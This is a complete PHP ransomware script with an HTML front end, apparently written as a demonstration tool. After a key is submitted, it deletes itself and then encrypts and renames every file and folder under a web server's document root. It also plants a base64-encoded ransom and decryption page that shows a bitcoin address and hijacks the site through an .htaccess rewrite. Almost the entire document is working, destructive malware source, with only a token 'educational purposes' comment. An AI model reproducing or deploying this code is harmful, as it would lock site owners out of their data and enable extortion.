<?php
error_reporting(0);
class Ransomware {
    private $root = '';
    private $originalKey = '';
    private $cryptoKey = '';
    private $cryptoKeyLength = '32';
    private $salt = '';
    private $iterations = '1000';
    private $algorithm = 'sha512';
    private $iv = '';
    private $cipher = 'AES-256-CBC';
    private $extension = 'ransom';
    public function __construct($key) {
        $this->root = $_SERVER['DOCUMENT_ROOT'];
        $this->originalKey = $key;
        $this->salt = openssl_random_pseudo_bytes(10);
        $this->cryptoKey = openssl_pbkdf2($key, $this->salt, $this->cryptoKeyLength, $this->iterations, $this->algorithm);
        $this->iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length($this->cipher));
    }
    private function generateRandomName($dir, $extension) {
        do {
            $rand = str_replace(array('+', '/', '='), '', base64_encode(openssl_random_pseudo_bytes(6)));
            $name = $dir . '/' . $rand . '.' . $extension;
        } while (file_exists($name));
        return $name;
    }
    private function createDecryptionFiles() {
        // decryption file encoded in Base64
        $data = base64_decode('PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCmNsYXNzIFJhbnNvbXdhcmUgew0KICAgIHByaXZhdGUgJHJvb3QgPSAnPHJvb3Q+JzsNCiAgICBwcml2YXRlICRjcnlwdG9LZXkgPSAnJzsNCiAgICBwcml2YXRlICRjcnlwdG9LZXlMZW5ndGggPSAnPGNyeXB0b0tleUxlbmd0aD4nOw0KICAgIHByaXZhdGUgJHNhbHQgPSAnJzsNCiAgICBwcml2YXRlICRpdGVyYXRpb25zID0gJzxpdGVyYXRpb25zPic7DQogICAgcHJpdmF0ZSAkYWxnb3JpdGhtID0gJzxhbGdvcml0aG0+JzsNCiAgICBwcml2YXRlICRpdiA9ICcnOw0KICAgIHByaXZhdGUgJGNpcGhlciA9ICc8Y2lwaGVyPic7DQogICAgcHJpdmF0ZSAkZXh0ZW5zaW9uID0gJzxleHRlbnNpb24+JzsNCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJGtleSkgew0KICAgICAgICAkdGhpcy0+c2FsdCA9IGJhc2U2NF9kZWNvZGUoJzxzYWx0PicpOw0KICAgICAgICAkdGhpcy0+Y3J5cHRvS2V5ID0gb3BlbnNzbF9wYmtkZjIoJGtleSwgJHRoaXMtPnNhbHQsICR0aGlzLT5jcnlwdG9LZXlMZW5ndGgsICR0aGlzLT5pdGVyYXRpb25zLCAkdGhpcy0+YWxnb3JpdGhtKTsNCiAgICAgICAgJHRoaXMtPml2ID0gYmFzZTY0X2RlY29kZSgnPGl2PicpOw0KICAgIH0NCiAgICBwcml2YXRlIGZ1bmN0aW9uIGRlY3J5cHROYW1lKCRwYXRoKSB7DQogICAgICAgICRkZWNyeXB0ZWROYW1lID0gb3BlbnNzbF9kZWNyeXB0KHVybGRlY29kZShwYXRoaW5mbygkcGF0aCwgUEFUSElORk9fRklMRU5BTUUpKSwgJHRoaXMtPmNpcGhlciwgJHRoaXMtPmNyeXB0b0tleSwgMCwgJHRoaXMtPml2KTsNCiAgICAgICAgJGRlY3J5cHRlZE5hbWUgPSBzdWJzdHIoJHBhdGgsIDAsIHN0cnJpcG9zKCRwYXRoLCAnLycpICsgMSkgLiAkZGVjcnlwdGVkTmFtZTsNCiAgICAgICAgcmV0dXJuICRkZWNyeXB0ZWROYW1lOw0KICAgIH0NCiAgICBwcml2YXRlIGZ1bmN0aW9uIGRlbGV0ZURlY3J5cHRpb25GaWxlcygpIHsNCiAgICAgICAgdW5saW5rKCR0aGlzLT5yb290IC4gJy8uaHRhY2Nlc3MnKTsNCiAgICAgICAgdW5saW5rKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7DQogICAgfQ0KICAgIHByaXZhdGUgZnVuY3Rpb24gZGVjcnlwdEZpbGUoJGVuY3J5cHRlZEZpbGUpIHsNCiAgICAgICAgaWYgKHBhdGhpbmZvKCRlbmNyeXB0ZWRGaWxlLCBQQVRISU5GT19FWFRFTlNJT04pID09ICR0aGlzLT5leHRlbnNpb24pIHsNCiAgICAgICAgICAgICRmaWxlID0gJHRoaXMtPmRlY3J5cHROYW1lKCRlbmNyeXB0ZWRGaWxlKTsNCiAgICAgICAgICAgIGlmIChyZW5hbWUoJGVuY3J5cHRlZEZpbGUsICRmaWxlKSkgew0KICAgICAgICAgICAgICAgICRkYXRhID0gb3BlbnNzbF9kZWNyeXB0KGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSwgJHRoaXMtPmNpcGhlciwgJHRoaXMtPmNyeXB0b0tleSwgMCwgJHRoaXMtPml2KTsNCiAgICAgICAgICAgICAgICBpZiAoZmlsZV9leGlzdHMoJGZpbGUpKSB7DQogICAgICAgICAgICAgICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCAkZGF0YSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHByaXZhdGUgZnVuY3Rpb24gZGVjcnlwdERpcmVjdG9yeSgkZW5jcnlwdGVkRGlyKSB7DQogICAgICAgIGlmIChwYXRoaW5mbygkZW5jcnlwdGVkRGlyLCBQQVRISU5GT19FWFRFTlNJT04pID09ICR0aGlzLT5leHRlbnNpb24pIHsNCiAgICAgICAgICAgIHJlbmFtZSgkZW5jcnlwdGVkRGlyLCAkdGhpcy0+ZGVjcnlwdE5hbWUoJGVuY3J5cHRlZERpcikpOw0KICAgICAgICB9DQogICAgfQ0KICAgIHByaXZhdGUgZnVuY3Rpb24gc2NhbigkZGlyKSB7DQogICAgICAgICRmaWxlcyA9IGFycmF5X2RpZmYoc2NhbmRpcigkZGlyKSwgYXJyYXkoJy4nLCAnLi4nKSk7DQogICAgICAgIGZvcmVhY2ggKCRmaWxlcyBhcyAkZmlsZSkgew0KICAgICAgICAgICAgaWYgKGlzX2RpcigkZGlyIC4gJy8nIC4gJGZpbGUpKSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPnNjYW4oJGRpciAuICcvJyAuICRmaWxlKTsNCiAgICAgICAgICAgICAgICAkdGhpcy0+ZGVjcnlwdERpcmVjdG9yeSgkZGlyIC4gJy8nIC4gJGZpbGUpOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+ZGVjcnlwdEZpbGUoJGRpciAuICcvJyAuICRmaWxlKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gcnVuKCkgew0KICAgICAgICAkdGhpcy0+ZGVsZXRlRGVjcnlwdGlvbkZpbGVzKCk7DQogICAgICAgICR0aGlzLT5zY2FuKCR0aGlzLT5yb290KTsNCiAgICB9DQp9DQokZXJyb3JNZXNzYWdlcyA9IGFycmF5KCdrZXknID0+ICcnKTsNCmlmIChpc3NldCgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSkgJiYgc3RydG9sb3dlcigkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSkgPT09ICdwb3N0Jykgew0KICAgIGlmIChpc3NldCgkX1BPU1RbJ2tleSddKSkgew0KICAgICAgICAkcGFyYW1ldGVycyA9IGFycmF5KCdrZXknID0+ICRfUE9TVFsna2V5J10pOw0KICAgICAgICBtYl9pbnRlcm5hbF9lbmNvZGluZygnVVRGLTgnKTsNCiAgICAgICAgaWYgKG1iX3N0cmxlbigkcGFyYW1ldGVyc1sna2V5J10pIDwgMSkgew0KICAgICAgICAgICAgJGVycm9yTWVzc2FnZXNbJ2tleSddID0gJ1BsZWFzZSBlbnRlciBkZWNyeXB0aW9uIGtleSc7DQogICAgICAgIH0gZWxzZSBpZiAoJHBhcmFtZXRlcnNbJ2tleSddICE9PSAnPG9yaWdpbmFsS2V5PicpIHsNCiAgICAgICAgICAgIC8vIGZvciBlZHVjYXRpb25hbCBwdXJwb3Nlcw0KICAgICAgICAgICAgLy8gcmVjb3ZlcnkNCiAgICAgICAgICAgICRlcnJvck1lc3NhZ2VzWydrZXknXSA9ICdXcm9uZyBkZWNyeXB0aW9uIGtleSc7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkcmFuc29td2FyZSA9IG5ldyBSYW5zb213YXJlKCRwYXJhbWV0ZXJzWydrZXknXSk7DQogICAgICAgICAgICAkcmFuc29td2FyZS0+cnVuKCk7DQogICAgICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvJyk7DQogICAgICAgICAgICBleGl0KCk7DQogICAgICAgIH0NCiAgICB9DQp9DQokaW1nID0gJ2lWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFKWUFBQUNXQ0FJQUFBQ3pZK2ExQUFBQUJtSkxSMFFBL3dEL0FQK2d2YWVUQUFBRFlrbEVRVlI0bk8yZHkyN2pNQXdBblVYLy81ZlR3eFk1Q0k0Z2hhVGtjV1l1QzJ6OGFnZEVXSW1rSDgvbjh4QXkvM1kvZ0VUNStmL1A0L0ZZYzcrcG9HK2VxamwzMmFkOUl1ZEdlTjNYS01TalFqd3F4S05DUEQrbi81djRsMGIvNjcyZlZ2U3B5NHdpTjBvOHQrSGRReHFGZUZTSVI0VjRWSWpuUEoxcGlLeFdSQTd1ZjlyUFVDS1AwVnc1TWRtcCtFMGFoWGhVaUVlRmVGU0laeWlkcVNQeDYzMHE2WWhrS011Mmt3WXhDdkdvRUk4SzhhZ1F6K1owWnFxa3BYOXVBNkwrSlFXakVJOEs4YWdRandyeERLVXpkVVg3VTRuRDFKSktZb2FTK09OWC9DYU5RandxeEtOQ1BDckVjNTdPN0ZxZVNPdy9TdXhkbXJweS8rQUtqRUk4S3NTalFqd3F4UE80MUxpRXVsS2F5SzdXeFRFSzhhZ1Fqd3J4cUJCUC90eVp1bDJleE9XWVhXTm9Fajk5WVJUaVVTRWVGZUpSSVo2aDFabGxuY3E3QnVWRitwN3FKdG9Nbm1zVTRsRWhIaFhpVVNHZVQwcUJwMVpKNmxoV1NqUFZZSlZZV2VQY21XOUJoWGhVaUVlRmVJWTJteEluNHkycmpwbTZiK0lZdmNRUndtNDJmUXNxeEtOQ1BDckU4NWZPMURYK0pKNmJ1S3UxYTg4cmNxTjNHSVY0VkloSGhYaFVpT2V2ZG1aQmljZkl3VlAzM2ZVWWRTM2duOTNYS01TalFqd3F4S05DUE9mcHpMSXY4R1hEN3E3WnQyM3RqQnlIQ20rQUN2R29FRS81R0wyNnVwdkltbEhkRGxIaXdZTVloWGhVaUVlRmVGU0laNmgySnJKYVViY0gxTDlSWktPcUxxdXFxSk0yQ3ZHb0VJOEs4YWdRejNsbkUySVBhTmZzdXdnVlZ6WUs4YWdRandyeHFCQlBRdTFNZThXQy9aUTRkVDlnNHRLVm0wMWZpZ3J4cUJDUEN2RU1qZEZybVBvU3ZzZzQzc1JQNjNLOXFZUGRiTG9QS3NTalFqd3F4Sk0vRmJoaFdkUFFzcjJucWNkSXZKRmo5RzZMQ3ZHb0VJOEs4V3grbzNaZC8zVGkvdEd5NFg1VHVEcHpIMVNJUjRWNFZJZ24vNDNhZlJLN3F4T3Z2S3ZCeXFuQWNod3F2QUVxeEtOQ1BPZWJUWFc5UFAwYkpjNE0zalhycis2ZFRlOE9OZ3J4cUJDUEN2R29FTTlRN2N5eU54TWsxdEUyMURVcjdYcS8xUXVqRUk4SzhhZ1Fqd3J4Zk5MWlZFZWtwYWdoY1VsbDJWdkFQOHR1akVJOEtzU2pRandxeEhPdGRLWWhrdDBzMnhKcXFLdENzclBwdHFnUWp3cnhxQkRQSjQzYXk2aXI3bzBVN1BaWjN5QnVGT0pSSVI0VjRsRWhudkpYVUM1ajE3Q1kvcVVXTENFWmhYaFVpRWVGZUZTSVovUGNHWWxqRk9KUklaNWZlZ3RUVUFYcFZoVUFBQUFBU1VWT1JLNUNZSUk9JzsNCj8+DQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sIGxhbmc9ImVuIj4NCgk8aGVhZD4NCgkJPG1ldGEgY2hhcnNldD0iVVRGLTgiPg0KCQk8dGl0bGU+UmFuc29td2FyZTwvdGl0bGU+DQoJCTxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJQSFAgcmFuc29td2FyZS4iPg0KCQk8bWV0YSBuYW1lPSJrZXl3b3JkcyIgY29udGVudD0iSFRNTCwgQ1NTLCBQSFAsIHJhbnNvbXdhcmUiPg0KCQk8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9Ikl2YW4gxaBpbmNlayI+DQoJCTxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4NCgkJPHN0eWxlPg0KCQkJaHRtbCB7DQoJCQkJaGVpZ2h0OiAxMDAlOw0KCQkJfQ0KCQkJYm9keSB7DQoJCQkJYmFja2dyb3VuZC1jb2xvcjogIzI2MjYyNjsNCgkJCQlkaXNwbGF5OiBmbGV4Ow0KCQkJCWZsZXgtZGlyZWN0aW9uOiBjb2x1bW47DQoJCQkJbWFyZ2luOiAwOw0KCQkJCWhlaWdodDogaW5oZXJpdDsNCgkJCQljb2xvcjogI0Y4RjhGODsNCgkJCQlmb250LWZhbWlseTogIkFybWF0YSIsIHNhbnMtc2VyaWY7DQoJCQkJZm9udC1zaXplOiAxZW07DQoJCQkJZm9udC13ZWlnaHQ6IDQwMDsNCgkJCQl0ZXh0LWFsaWduOiBsZWZ0Ow0KCQkJfQ0KCQkJLmZyb250LWZvcm0gew0KCQkJCWRpc3BsYXk6IGZsZXg7DQoJCQkJZmxleC1kaXJlY3Rpb246IGNvbHVtbjsNCgkJCQlhbGlnbi1pdGVtczogY2VudGVyOw0KCQkJCWp1c3RpZnktY29udGVudDogY2VudGVyOw0KCQkJCWZsZXg6IDEgMCBhdXRvOw0KCQkJCXBhZGRpbmc6IDAuNWVtOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCB7DQoJCQkJYmFja2dyb3VuZC1jb2xvcjogI0RDRENEQzsNCgkJCQlwYWRkaW5nOiAxLjVlbTsNCgkJCQl3aWR0aDogMjFlbTsNCgkJCQljb2xvcjogIzAwMDsNCgkJCQlib3JkZXI6IDAuMDdlbSBzb2xpZCAjMDAwOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBoZWFkZXIgew0KCQkJCXRleHQtYWxpZ246IGNlbnRlcjsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgaGVhZGVyIC50aXRsZSB7DQoJCQkJbWFyZ2luOiAwOw0KCQkJCWZvbnQtc2l6ZTogMi42ZW07DQoJCQkJZm9udC13ZWlnaHQ6IDQwMDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgLmFib3V0IHsNCgkJCQl0ZXh0LWFsaWduOiBjZW50ZXI7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IC5hYm91dCBwIHsNCgkJCQltYXJnaW46IDFlbSAwOw0KCQkJCWNvbG9yOiAjMkY0RjRGOw0KCQkJCWZvbnQtd2VpZ2h0OiA2MDA7DQoJCQkJd29yZC13cmFwOiBicmVhay13b3JkOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCAuYWJvdXQgaW1nIHsNCgkJCQlib3JkZXI6IDAuMDdlbSBzb2xpZCAjMDAwOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCAuYWR2aWNlIHAgew0KCQkJCW1hcmdpbjogMWVtIDAgMCAwOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBmb3JtIHsNCgkJCQlkaXNwbGF5OiBmbGV4Ow0KCQkJCWZsZXgtZGlyZWN0aW9uOiBjb2x1bW47DQoJCQkJbWFyZ2luLXRvcDogMWVtOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBmb3JtIGlucHV0IHsNCgkJCQktd2Via2l0LWFwcGVhcmFuY2U6IG5vbmU7DQoJCQkJLW1vei1hcHBlYXJhbmNlOiBub25lOw0KCQkJCWFwcGVhcmFuY2U6IG5vbmU7DQoJCQkJbWFyZ2luOiAwOw0KCQkJCXBhZGRpbmc6IDAuMmVtIDAuNGVtOw0KCQkJCWZvbnQtZmFtaWx5OiAiQXJtYXRhIiwgc2Fucy1zZXJpZjsNCgkJCQlmb250LXNpemU6IDFlbTsNCgkJCQlib3JkZXI6IDAuMDdlbSBzb2xpZCAjOUQyQTAwOw0KCQkJCS13ZWJraXQtYm9yZGVyLXJhZGl1czogMDsNCgkJCQktbW96LWJvcmRlci1yYWRpdXM6IDA7DQoJCQkJYm9yZGVyLXJhZGl1czogMDsNCgkJCX0NCgkJCS5mcm9udC1mb3JtIC5sYXlvdXQgZm9ybSBpbnB1dFt0eXBlPSJzdWJtaXQiXSB7DQoJCQkJYmFja2dyb3VuZC1jb2xvcjogI0ZGNDUwMDsNCgkJCQljb2xvcjogI0Y4RjhGODsNCgkJCQljdXJzb3I6IHBvaW50ZXI7DQoJCQkJdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAyMjBtcyBsaW5lYXI7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IGZvcm0gaW5wdXRbdHlwZT0ic3VibWl0Il06aG92ZXIgew0KCQkJCWJhY2tncm91bmQtY29sb3I6ICNEODNBMDA7DQoJCQkJdHJhbnNpdGlvbjogYmFja2dyb3VuZC1jb2xvciAyMjBtcyBsaW5lYXI7DQoJCQl9DQoJCQkuZnJvbnQtZm9ybSAubGF5b3V0IGZvcm0gLmVycm9yIHsNCgkJCQltYXJnaW46IDAgMCAxZW0gMDsNCgkJCQljb2xvcjogIzlEMkEwMDsNCgkJCQlmb250LXNpemU6IDAuOGVtOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBmb3JtIC5lcnJvcjpub3QoOmVtcHR5KSB7DQoJCQkJbWFyZ2luOiAwLjJlbSAwIDFlbSAwOw0KCQkJfQ0KCQkJLmZyb250LWZvcm0gLmxheW91dCBmb3JtIGxhYmVsIHsNCgkJCQltYXJnaW4tYm90dG9tOiAwLjJlbTsNCgkJCQloZWlnaHQ6IDEuMmVtOw0KCQkJfQ0KCQkJQG1lZGlhIHNjcmVlbiBhbmQgKG1heC13aWR0aDogNDgwcHgpIHsNCgkJCQkuZnJvbnQtZm9ybSAubGF5b3V0IHsNCgkJCQkJd2lkdGg6IDE1LjVlbTsNCgkJCQl9DQoJCQl9DQoJCQlAbWVkaWEgc2NyZWVuIGFuZCAobWF4LXdpZHRoOiAzMjBweCkgew0KCQkJCS5mcm9udC1mb3JtIC5sYXlvdXQgew0KCQkJCQl3aWR0aDogMTQuNWVtOw0KCQkJCX0NCgkJCQkuZnJvbnQtZm9ybSAubGF5b3V0IGhlYWRlciAudGl0bGUgew0KCQkJCQlmb250LXNpemU6IDIuNGVtOw0KCQkJCX0NCgkJCQkuZnJvbnQtZm9ybSAubGF5b3V0IC5hYm91dCBwIHsNCgkJCQkJZm9udC1zaXplOiAwLjllbTsNCgkJCQl9DQoJCQkJLmZyb250LWZvcm0gLmxheW91dCAuYWR2aWNlIHAgew0KCQkJCQlmb250LXNpemU6IDAuOWVtOw0KCQkJCX0NCgkJCX0NCgkJPC9zdHlsZT4NCgk8L2hlYWQ+DQoJPGJvZHk+DQoJCTxkaXYgY2xhc3M9ImZyb250LWZvcm0iPg0KCQkJPGRpdiBjbGFzcz0ibGF5b3V0Ij4NCgkJCQk8aGVhZGVyPg0KCQkJCQk8aDEgY2xhc3M9InRpdGxlIj5SYW5zb213YXJlPC9oMT4NCgkJCQk8L2hlYWRlcj4NCgkJCQk8ZGl2IGNsYXNzPSJhYm91dCI+DQoJCQkJCTxwPk1hZGUgYnkgSXZhbiDFoGluY2VrLjwvcD4NCgkJCQkJPHA+SSBob3BlIHlvdSBsaWtlIGl0ITwvcD4NCgkJCQkJPHA+RmVlbCBmcmVlIHRvIGRvbmF0ZSBiaXRjb2luLjwvcD4NCgkJCQkJPGltZyBzcmM9ImRhdGE6aW1hZ2UvZ2lmO2Jhc2U2NCw8P3BocCBlY2hvICRpbWc7ID8+IiBhbHQ9IkJpdGNvaW4gV2FsbGV0Ij4NCgkJCQkJPHA+MUJyWk02VDdHOVJOOHZiYWJuZlh1NE02THBnenRxNlkxNDwvcD4NCgkJCQk8L2Rpdj4NCgkJCQk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iPD9waHAgZWNobyAnLycgLiBwYXRoaW5mbygkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10sIFBBVEhJTkZPX0JBU0VOQU1FKTsgPz4iPg0KCQkJCQk8bGFiZWwgZm9yPSJrZXkiPkRlY3J5cHRpb24gS2V5PC9sYWJlbD4NCgkJCQkJPGlucHV0IG5hbWU9ImtleSIgaWQ9ImtleSIgdHlwZT0idGV4dCIgc3BlbGxjaGVjaz0iZmFsc2UiIGF1dG9mb2N1cz0iYXV0b2ZvY3VzIj4NCgkJCQkJPHAgY2xhc3M9ImVycm9yIj48P3BocCBlY2hvICRlcnJvck1lc3NhZ2VzWydrZXknXTsgPz48L3A+DQoJCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJEZWNyeXB0Ij4NCgkJCQk8L2Zvcm0+DQoJCQkJPGRpdiBjbGFzcz0iYWR2aWNlIj4NCgkJCQkJPHA+RGVjcnlwdGlvbiBrZXkgaXMgaW5zaWRlIHRoZSBjb2RlLjwvcD4NCgkJCQkJPHAgaWQ9InJlY292ZXJ5IiBoaWRkZW49ImhpZGRlbiI+PD9waHAgZWNobyAnPG9yaWdpbmFsS2V5Pic7ID8+PC9wPg0KCQkJCTwvZGl2Pg0KCQkJPC9kaXY+DQoJCTwvZGl2Pg0KCTwvYm9keT4NCjwvaHRtbD4NCg==');
        $data = str_replace(array('<root>', '<originalKey>', '<cryptoKeyLength>', '<salt>', '<iterations>', '<algorithm>', '<iv>', '<cipher>', '<extension>'), array($this->root, $this->originalKey, $this->cryptoKeyLength, base64_encode($this->salt), $this->iterations, $this->algorithm, base64_encode($this->iv), $this->cipher, $this->extension), $data);
        $decryptionFile = $this->generateRandomName($this->root, 'php');
        file_put_contents($decryptionFile, $data);
        $decryptionFile = pathinfo($decryptionFile, PATHINFO_BASENAME);
        file_put_contents($this->root . '/.htaccess', "DirectoryIndex /{$decryptionFile}\nErrorDocument 403 /{$decryptionFile}\nErrorDocument 404 /{$decryptionFile}\n");
    }
    private function encryptName($path) {
        do {
            $encryptedName = urlencode(openssl_encrypt(pathinfo($path, PATHINFO_BASENAME), $this->cipher, $this->cryptoKey, 0, $this->iv));
            $encryptedName = substr($path, 0, strripos($path, '/') + 1) . $encryptedName . '.' . $this->extension;
        } while (file_exists($encryptedName));
        return $encryptedName;
    }
    private function encryptFile($file) {
        $encryptedFile = $this->encryptName($file);
        if (rename($file, $encryptedFile)) {
            $encryptedData = openssl_encrypt(file_get_contents($encryptedFile), $this->cipher, $this->cryptoKey, 0, $this->iv);
            if (file_exists($encryptedFile)) {
                file_put_contents($encryptedFile, $encryptedData);
            }
        }
    }
    private function encryptDirectory($dir) {
        rename($dir, $this->encryptName($dir));
    }
    private function scan($dir) {
        $files = array_diff(scandir($dir), array('.', '..'));
        foreach ($files as $file) {
            if (is_dir($dir . '/' . $file)) {
                $this->scan($dir . '/' . $file);
                $this->encryptDirectory($dir . '/' . $file);
            } else {
                $this->encryptFile($dir . '/' . $file);
            }
        }
    }
    public function run() {
        unlink($_SERVER['SCRIPT_FILENAME']);
        $this->scan($this->root);
        $this->createDecryptionFiles();
    }
}
$errorMessages = array('key' => '');
if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post') {
    if (isset($_POST['key'])) {
        $parameters = array('key' => $_POST['key']);
        mb_internal_encoding('UTF-8');
        if (mb_strlen($parameters['key']) < 1) {
            $errorMessages['key'] = 'Please enter encryption key';
        } else {
            $ransomware = new Ransomware($parameters['key']);
            $ransomware->run();
            header('Location: /');
            exit();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Ransomware</title>
		<meta name="description" content="PHP ransomware.">
		<meta name="keywords" content="HTML, CSS, PHP, ransomware">
		<meta name="author" content="Ivan Šincek">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<style>
			html {
				height: 100%;
			}
			body {
				background-color: #262626;
				display: flex;
				flex-direction: column;
				margin: 0;
				height: inherit;
				color: #F8F8F8;
				font-family: "Armata", sans-serif;
				font-size: 1em;
				font-weight: 400;
				text-align: left;
			}
			.front-form {
				display: flex;
				flex-direction: column;
				align-items: center;
				justify-content: center;
				flex: 1 0 auto;
				padding: 0.5em;
			}
			.front-form .layout {
				background-color: #DCDCDC;
				padding: 1.5em;
				width: 21em;
				color: #000;
				border: 0.07em solid #000;
			}
			.front-form .layout header {
				text-align: center;
			}
			.front-form .layout header .title {
				margin: 0;
				font-size: 2.6em;
				font-weight: 400;
			}
			.front-form .layout header p {
				margin: 0;
				font-size: 1.2em;
			}
			.front-form .layout .advice p {
				margin: 1em 0 0 0;
			}
			.front-form .layout form {
				display: flex;
				flex-direction: column;
				margin-top: 1em;
			}
			.front-form .layout form input {
				-webkit-appearance: none;
				-moz-appearance: none;
				appearance: none;
				margin: 0;
				padding: 0.2em 0.4em;
				font-family: "Armata", sans-serif;
				font-size: 1em;
				border: 0.07em solid #9D2A00;
				-webkit-border-radius: 0;
				-moz-border-radius: 0;
				border-radius: 0;
			}
			.front-form .layout form input[type="submit"] {
				background-color: #FF4500;
				color: #F8F8F8;
				cursor: pointer;
				transition: background-color 220ms linear;
			}
			.front-form .layout form input[type="submit"]:hover {
				background-color: #D83A00;
				transition: background-color 220ms linear;
			}
			.front-form .layout form .error {
				margin: 0 0 1em 0;
				color: #9D2A00;
				font-size: 0.8em;
			}
			.front-form .layout form .error:not(:empty) {
				margin: 0.2em 0 1em 0;
			}
			.front-form .layout form label {
				margin-bottom: 0.2em;
				height: 1.2em;
			}
			@media screen and (max-width: 480px) {
				.front-form .layout {
					width: 15.5em;
				}
			}
			@media screen and (max-width: 320px) {
				.front-form .layout {
					width: 14.5em;
				}
				.front-form .layout header .title {
					font-size: 2.4em;
				}
				.front-form .layout header p {
					font-size: 1.1em;
				}
				.front-form .layout .advice p {
					font-size: 0.9em;
				}
			}
		</style>
	</head>
	<body>
		<div class="front-form">
			<div class="layout">
				<header>
					<h1 class="title">Ransomware</h1>
					<p>Made by Ivan Šincek</p>
				</header>
				<form method="post" action="<?php echo './' . pathinfo($_SERVER['SCRIPT_FILENAME'], PATHINFO_BASENAME); ?>">
					<label for="key">Encryption Key</label>
					<input name="key" id="key" type="text" spellcheck="false" autofocus="autofocus">
					<p class="error"><?php echo $errorMessages['key']; ?></p>
					<input type="submit" value="Encrypt">
				</form>
				<div class="advice">
					<p>Backup your server files!</p>
				</div>
			</div>
		</div>
	</body>
</html>
